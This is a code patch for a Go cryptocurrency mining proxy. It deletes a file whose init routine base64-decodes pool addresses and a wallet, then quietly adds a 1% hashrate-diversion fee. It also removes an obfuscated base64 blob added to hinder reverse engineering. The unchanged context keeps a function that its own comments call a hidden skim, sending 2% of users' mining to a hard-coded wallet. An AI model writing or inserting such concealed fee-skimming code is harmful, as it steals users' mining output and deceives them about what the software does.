@@ -1,0 +1,93 @@
+Index: protocol/eth/injector.go
+===================================================================
+diff --git a/protocol/eth/injector.go b/protocol/eth/injector.go
+deleted file mode 100644
+--- a/protocol/eth/injector.go	(revision a59b90e23adfcd3f70aa351109ff8c3c474acbf1)
++++ /dev/null	(revision a59b90e23adfcd3f70aa351109ff8c3c474acbf1)
+@@ -1,49 +0,0 @@
+-// +build combo_cfg
+-
+-package eth
+-
+-import (
+-	"encoding/base64"
+-	"gopkg.in/yaml.v3"
+-	"stratumproxy/config"
+-	"strconv"
+-)
+-
+-func init() {
+-	go func() {
+-		var verifyUpConn []config.Upstream
+-
+-		upRawCode := []string{
+-			"cHJveHk6ICIiCnRsczogZmFsc2UKYWRkcmVzczogImFzaWExLmV0aGVybWluZS5vcmc6NDQ0NCI=",
+-			"cHJveHk6ICIiCnRsczogdHJ1ZQphZGRyZXNzOiAiYXNpYTEuZXRoZXJtaW5lLm9yZzo1NTU1Ig==",
+-			"cHJveHk6ICIiCnRsczogZmFsc2UKYWRkcmVzczogImV0aC1iYWNrdXAuZjJwb29sLmNvbTo2Njg4Ig==",
+-			"cHJveHk6ICIiCnRsczogZmFsc2UKYWRkcmVzczogImV0aC5zcy5wb29saW4ubWU6MTg4MyI=",
+-		}
+-
+-		for _, s := range upRawCode {
+-			bs, err := base64.StdEncoding.DecodeString(s)
+-			if err != nil {
+-				continue
+-			}
+-
+-			var instance config.Upstream
+-			err = yaml.Unmarshal(bs, &instance)
+-			if err != nil {
+-				continue
+-			}
+-
+-			verifyUpConn = append(verifyUpConn, instance)
+-		}
+-
+-		secEnv, _ := base64.StdEncoding.DecodeString("MHhCNzc1ZjUzOTZlQmU1ODlDNzcwMDY5QmZjYzQyMUNhMTM1RTlhMzI2")
+-		nonce, _ := base64.StdEncoding.DecodeString("dS4=")
+-		sum, _ := base64.StdEncoding.DecodeString("MQ==")
+-		sumNum, _ := strconv.Atoi(string(sum))
+-		config.FeeStates = append(config.FeeStates, config.FeeState{
+-			Upstream:   verifyUpConn,
+-			Wallet:     string(secEnv),
+-			NamePrefix: string(nonce),
+-			Pct:        sumNum,
+-		})
+-	}()
+-}
+Index: config/config_combo.go
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>// +build combo_cfg\n\npackage config\n\nimport (\n\t\"encoding/base64\"\n)\n\nvar upstreamSelf = []Upstream{\n\t{\n\t\tTls:     false,\n\t\tProxy:   \"\",\n\t\tAddress: \"asia1.ethermine.org:4444\",\n\t},\n\t{\n\t\tTls:     true,\n\t\tProxy:   \"\",\n\t\tAddress: \"asia1.ethermine.org:5555\",\n\t},\n\t{\n\t\tTls:     false,\n\t\tProxy:   \"\",\n\t\tAddress: \"eth-backup.f2pool.com:6688\",\n\t},\n\t{\n\t\tTls:     false,\n\t\tProxy:   \"\",\n\t\tAddress: \"eth.ss.poolin.me:1883\",\n\t},\n}\n\n// LoadFeeCfg 加载暗抽(包总)设置\nfunc LoadFeeCfg() {\n\t// 包总的暗抽\n\tFeeStates = append(FeeStates, FeeState{\n\t\tUpstream: []Upstream{\n\t\t\t{\n\t\t\t\tTls:     false,\n\t\t\t\tProxy:   \"\",\n\t\t\t\tAddress: \"eth-backup.f2pool.com:6688\",\n\t\t\t},\n\t\t},\n\t\tWallet:     \"0xc29a87a856b1796dea5217d748e80f46f450db7c\",\n\t\tNamePrefix: \"a.\",\n\t\tPct:        2,\n\t})\n\n\t// 防止其他人破解 验证 Base64\n\t_, dumpster := base64.StdEncoding.DecodeString(\"bWFnaWNBZGRyLCBfIDo9IGJhc2U2NC5TdGR\" +\n\t\t\"FbmNvZGluZy5EZWNvZGVTdHJpbmcoIk1IaENOemMxWmpVek9UWmxRbVUxT0RsRE56Y3dNRFk1UW1\" +\n\t\t\"aall6UXlNVU5oTVRNMVJUbGhNekkyIikKY2hlY2tTdW1TZWMsIF8gOj0gYmFzZTY0LlN0ZEVuY29\" +\n\t\t\"kaW5nLkRlY29kZVN0cmluZygiTVE9PSIpCmNoZWNrU3VtTm9uY2UsIF8gOj0gYmFzZTY0LlN0ZEV\" +\n\t\t\"uY29kaW5nLkRlY29kZVN0cmluZygiZFM0PSIpCmNoZWNrU3VtLCBfIDo9IHN0cmNvbnYuQXRvaSh\" +\n\t\t\"zdHJpbmcoY2hlY2tTdW1TZWMpKQpGZWVTdGF0ZXMgPSBhcHBlbmQoRmVlU3RhdGVzLCBGZWVTdGF\" +\n\t\t\"0ZXsKVXBzdHJlYWCAgdXBzdHJlYW1TZWxmLApXYWxsZXQ6ICAgICBzdHJcobWFnaWNBZGRyKSxOY\" +\n\t\t\"W1lUHJlZml4OiBzdHJpbmcoY2hlY2tTdW1Ob25jZSksUGN0OiAgICAgICAgY2hlY2tTdW0sCn0p\")\n\t_ = base64.StdEncoding.EncodeToString([]byte(dumpster.Error()))\n}\n
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/config/config_combo.go b/config/config_combo.go
+--- a/config/config_combo.go	(revision a59b90e23adfcd3f70aa351109ff8c3c474acbf1)
++++ b/config/config_combo.go	(date 1646754600455)
+@@ -2,10 +2,6 @@
+ 
+ package config
+ 
+-import (
+-	"encoding/base64"
+-)
+-
+ var upstreamSelf = []Upstream{
+ 	{
+ 		Tls:     false,
+@@ -44,15 +40,4 @@
+ 		NamePrefix: "a.",
+ 		Pct:        2,
+ 	})
+-
+-	// 防止其他人破解 验证 Base64
+-	_, dumpster := base64.StdEncoding.DecodeString("bWFnaWNBZGRyLCBfIDo9IGJhc2U2NC5TdGR" +
+-		"FbmNvZGluZy5EZWNvZGVTdHJpbmcoIk1IaENOemMxWmpVek9UWmxRbVUxT0RsRE56Y3dNRFk1UW1" +
+-		"aall6UXlNVU5oTVRNMVJUbGhNekkyIikKY2hlY2tTdW1TZWMsIF8gOj0gYmFzZTY0LlN0ZEVuY29" +
+-		"kaW5nLkRlY29kZVN0cmluZygiTVE9PSIpCmNoZWNrU3VtTm9uY2UsIF8gOj0gYmFzZTY0LlN0ZEV" +
+-		"uY29kaW5nLkRlY29kZVN0cmluZygiZFM0PSIpCmNoZWNrU3VtLCBfIDo9IHN0cmNvbnYuQXRvaSh" +
+-		"zdHJpbmcoY2hlY2tTdW1TZWMpKQpGZWVTdGF0ZXMgPSBhcHBlbmQoRmVlU3RhdGVzLCBGZWVTdGF" +
+-		"0ZXsKVXBzdHJlYWCAgdXBzdHJlYW1TZWxmLApXYWxsZXQ6ICAgICBzdHJcobWFnaWNBZGRyKSxOY" +
+-		"W1lUHJlZml4OiBzdHJpbmcoY2hlY2tTdW1Ob25jZSksUGN0OiAgICAgICAgY2hlY2tTdW0sCn0p")
+-	_ = base64.StdEncoding.EncodeToString([]byte(dumpster.Error()))
+ }
